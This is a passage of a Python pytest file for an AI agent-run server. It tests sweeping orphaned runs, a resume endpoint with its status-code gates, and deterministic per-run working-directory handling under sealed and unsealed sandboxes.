            self._strand(registry, s, hold_result=True)
            for s in ("pending", "running", "waiting", "cancelling")
        ]
        done = registry.start_run(task="t", tools=[], provider="p", model="m")
        registry.finish_run(done, status="completed", result="x")

        assert registry.sweep_orphans() == 4
        for m in stranded:
            after = registry.get_run(m.run_id)
            assert after.status == "interrupted"
            assert "restarted" in after.error
            assert after.waiting is None        # a park can't outlive its future
            assert after.finished_at is not None
            assert after.resumable is True      # conclusive /task checkpoints
            state = registry._store.load_state(m.run_id)
            assert state["via"] == "restart_sweep"
            types = [e.type for e in registry.read_events(m.run_id)]
            assert "agent_run_interrupted" in types
        assert registry.get_run(done.run_id).status == "completed"  # untouched

    def test_resumable_judgement(self, registry):
        task_run = self._strand(registry, "running", hold_result=True)
        run_tier = self._strand(registry, "running")               # no hold
        no_model = self._strand(registry, "running", hold_result=True, model=None)
        registry.sweep_orphans()
        assert registry.get_run(task_run.run_id).resumable is True
        assert registry.get_run(run_tier.run_id).resumable is False
        assert registry.get_run(no_model.run_id).resumable is False

    def test_in_flight_run_not_swept(self, registry):
        # Same-process safety: a run with a live task entry is NOT an orphan.
        m = self._strand(registry, "running", hold_result=True)
        registry._run_tasks[m.run_id] = object()  # sentinel "in flight"
        try:
            assert registry.sweep_orphans() == 0
            assert registry.get_run(m.run_id).status == "running"
        finally:
            registry._run_tasks.pop(m.run_id, None)

    def test_sweep_idempotent(self, registry):
        self._strand(registry, "running", hold_result=True)
        assert registry.sweep_orphans() == 1
        assert registry.sweep_orphans() == 0  # already interrupted


class TestResumeRoute:
    """POST /v1/agent/runs/{id}/resume — gate, refusal, and the rebuild."""

    def _seed_interrupted(self, reg, **kw):
        start = dict(task="t", tools=["read_file"], provider="p", model="m",
                     hold_result=True, system="be terse",
                     read_roots=["/skills/ci"])
        start.update(kw)
        m = reg.start_run(**start)
        reg.finish_run(m, status="interrupted", error="budget", resumable=True)
        return m

    def test_tier_gate_403(self, client, monkeypatch):
        c, reg = client
        m = self._seed_interrupted(reg)
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(
            agent_v1, "get_execution_task_config",
            lambda: {"enabled": False},
        )
        r = c.post(f"/v1/agent/runs/{m.run_id}/resume")
        assert r.status_code == 403
        assert "execution.task.enabled" in r.json()["detail"]

    def test_unknown_run_404(self, client):
        c, _ = client
        assert c.post("/v1/agent/runs/run_nope/resume").status_code == 404

    def test_refusal_409_run_unchanged(self, client):
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m",
                          hold_result=True)
        reg.finish_run(m, status="completed_pending_ack", result="held")
        r = c.post(f"/v1/agent/runs/{m.run_id}/resume")
        assert r.status_code == 409
        assert "not resumable" in r.json()["detail"]
        assert reg.get_run(m.run_id).status == "completed_pending_ack"

    def test_run_tier_run_refused(self, client):
        # A cancelled /run-tier run is resumable-flagged (Inc 6) but NOT a
        # /task run — resume must refuse rather than rebuild a TASK runner
        # around a tool-free run.
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="cancelled", error="cancelled", resumable=True)
        r = c.post(f"/v1/agent/runs/{m.run_id}/resume")
        assert r.status_code == 409
        assert "top-level" in r.json()["detail"]

    def test_resume_rebuilds_runner_from_persisted_inputs(self, ctx_client, monkeypatch):
        import time as _t

        c, reg = ctx_client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda name: None)

        captured = {}

        def fake_build(registry_, **kw):
            captured.update(kw)

            async def _runner(m):
                return "resumed answer"
            return _runner

        monkeypatch.setattr(task_runner, "build_task_runner", fake_build)

        m = self._seed_interrupted(reg)
        r = c.post(f"/v1/agent/runs/{m.run_id}/resume")
        assert r.status_code == 200
        assert r.json() == {"ok": True, "run_id": m.run_id, "status": "running"}

        # The runner was rebuilt from the PERSISTED inputs (T7's whole point).
        assert captured["task"] == "t"
        assert captured["tools"] == ["read_file"]
        assert captured["provider_name"] == "p" and captured["model"] == "m"
        assert captured["system"] == "be terse"
        assert captured["extra_read_paths"] == ["/skills/ci"]
        assert captured["allow_spawn"] is True

        # …and the run continues to its normal held completion (hold_result
        # persisted on the meta, so T6 semantics apply to the resumed leg too).
        deadline = _t.monotonic() + 5.0
        one = None
        while _t.monotonic() < deadline:
            one = c.get(f"/v1/agent/runs/{m.run_id}").json()
            if one["status"] not in ("running", "pending"):
                break
            _t.sleep(0.02)
        assert one["status"] == "completed_pending_ack", one
        assert one["result"] == "resumed answer"
        assert one["error"] is None                # stale stop fields cleared
        evs = c.get(f"/v1/agent/runs/{m.run_id}/events").json()["events"]
        types = [e["type"] for e in evs]
        assert "agent_run_resume" in types
        # the resumed leg reuses the SAME event log (seq continues)
        seqs = [e["seq"] for e in evs]
        assert seqs == sorted(seqs) and len(set(seqs)) == len(seqs)


# ---------------------------------------------------------------------------
# Workdir alignment (v1.19.x) — per-run working-dir intent
# ---------------------------------------------------------------------------


class TestWorkdirAlignment:
    """A /task run's working dir is deterministic per-run intent: request
    `workdir` (seal OFF) → server default (server.working_dir → home) — never
    the server process launch dir. Sealed runs keep their jail; a requested
    workdir is then ignored and the launch response flags it so clients warn.
    """

    def _capture_build(self, monkeypatch):
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        captured = {}

        def fake_build(reg_, **kw):
            captured.update(kw)

            async def _ok(m):
                return "ok"
            return _ok

        monkeypatch.setattr(task_runner, "build_task_runner", fake_build)
        monkeypatch.setattr(agent_v1, "_validate_provider_or_400", lambda n: None)
        return captured

    def _body(self, **extra):
        return {"task": "t", "tools": ["read_file"], "provider": "p",
                "model": "m", **extra}

    def test_workdir_threaded_to_meta_runner_and_response(
        self, client, monkeypatch, tmp_path
    ):
        c, reg = client
        captured = self._capture_build(monkeypatch)
        wd = str(tmp_path)
        r = c.post("/v1/agent/task", json=self._body(workdir=wd))
        assert r.status_code == 200
        assert r.json()["workdir_ignored"] is False
        import os as _os
        expect = _os.path.abspath(_os.path.expanduser(wd))
        assert captured["workdir"] == expect
        run_id = r.json()["run_id"]
        assert reg.get_run(run_id).workdir == expect
        # …and the wire projection carries it (clients display `wd:`).
        assert c.get(f"/v1/agent/runs/{run_id}").json()["workdir"] == expect

    def test_nonexistent_workdir_is_a_400_not_a_mid_run_surprise(
        self, client, monkeypatch, tmp_path
    ):
        c, reg = client
        self._capture_build(monkeypatch)
        r = c.post("/v1/agent/task",
                   json=self._body(workdir=str(tmp_path / "nope")))
        assert r.status_code == 400
        assert "workdir" in r.json()["detail"]
        assert reg.list_runs() == []  # nothing minted

    def test_absent_workdir_stays_none_until_the_runner_defaults(
        self, client, monkeypatch
    ):
        # The route records None (intent absent); the runner applies the
        # server default at execution — so meta distinguishes "explicit"
        # from "defaulted".
        c, reg = client
        captured = self._capture_build(monkeypatch)
        r = c.post("/v1/agent/task", json=self._body())
        assert r.status_code == 200
        assert r.json()["workdir_ignored"] is False
        assert captured["workdir"] is None
        assert reg.get_run(r.json()["run_id"]).workdir is None

    def test_sealed_run_ignores_workdir_and_flags_it(
        self, client, monkeypatch, tmp_path
    ):
        c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        captured = self._capture_build(monkeypatch)
        real = agent_v1.get_execution_task_config  # already enabled=True
        monkeypatch.setattr(
            agent_v1, "get_execution_task_config",
            lambda: {**real(), "sandbox": {"enforcement": "in_process"}},
        )
        r = c.post("/v1/agent/task", json=self._body(workdir=str(tmp_path)))
        assert r.status_code == 200
        assert r.json()["workdir_ignored"] is True  # client renders the ⚠️
        assert captured["workdir"] is None          # the jail wins
        assert reg.get_run(r.json()["run_id"]).workdir is None

    def test_resume_threads_the_persisted_workdir(self, client, monkeypatch, tmp_path):
        c, reg = client
        captured = self._capture_build(monkeypatch)
        m = reg.start_run(task="t", tools=["read_file"], provider="p",
                          model="m", hold_result=True, workdir=str(tmp_path))
        reg.finish_run(m, status="interrupted", error="budget", resumable=True)
        r = c.post(f"/v1/agent/runs/{m.run_id}/resume")
        assert r.status_code == 200
        assert captured["workdir"] == str(tmp_path)

    def test_runner_sets_unsealed_workdir_deterministically(
        self, client, monkeypatch, tmp_path
    ):
        # The unsealed runner must set SOME deterministic working dir on the
        # run engine — the requested intent when given (vanished dir falls
        # back), else the server default — never silently inherit the
        # process launch dir (os.getcwd()).
        import asyncio
        _c, reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine import task_runner
        from ppxai.engine.types import Event, EventType

        seen = {}

        class _StubEngine:
            def __init__(self):
                self.tool_manager = type("TM", (), {"max_iterations": 3})()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def set_working_dir(self, d): seen["wd"] = d
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                yield Event(type=EventType.STREAM_END, data="ok")

        monkeypatch.setattr(
            task_runner, "EngineClient", lambda: _StubEngine(), raising=False
        )
        monkeypatch.setattr(
            task_runner, "get_default_working_dir", lambda: str(tmp_path)
        )

        def _drive(**runner_kw):
            m = reg.start_run(task="t", tools=["read_file"],
                              provider="p", model="m")
            runner = agent_v1.build_task_runner(
                reg, provider_name="p", model="m", task="t",
                tools=["read_file"], allow_outbound=[], **runner_kw,
            )
            asyncio.run(runner(m))
            return seen["wd"]

        # absent intent → the server default (not os.getcwd())
        assert _drive() == str(tmp_path)
        # explicit intent wins
        (tmp_path / "x").mkdir()
        assert _drive(workdir=str(tmp_path / "x")) == str(tmp_path / "x")
        # a vanished recorded workdir (the resume case) falls back safely
        assert _drive(workdir=str(tmp_path / "gone")) == str(tmp_path)

    def test_default_working_dir_prefers_config_then_home(
        self, monkeypatch, tmp_path
    ):
        # The runner's fallback: server.working_dir when set + existing,
        # else home — NEVER os.getcwd() (the pre-v1.19.x behavior that made
        # runs depend on where the operator launched the server).
        from pathlib import Path
        import ppxai.server.session_manager as sm
        # The body lives in config.paths since v1.19.1 and resolves
        # get_server_config from THAT module; patching the
        # session_manager re-export would be inert.
        import ppxai.config.paths as _paths
        monkeypatch.setattr(
            _paths, "get_server_config", lambda: {"working_dir": str(tmp_path)}
        )
        assert sm.get_default_working_dir() == str(tmp_path)
        monkeypatch.setattr(
            _paths, "get_server_config",
            lambda: {"working_dir": str(tmp_path / "gone")},
        )
        assert sm.get_default_working_dir() == str(Path.home())
        monkeypatch.setattr(_paths, "get_server_config", lambda: {})
        assert sm.get_default_working_dir() == str(Path.home())
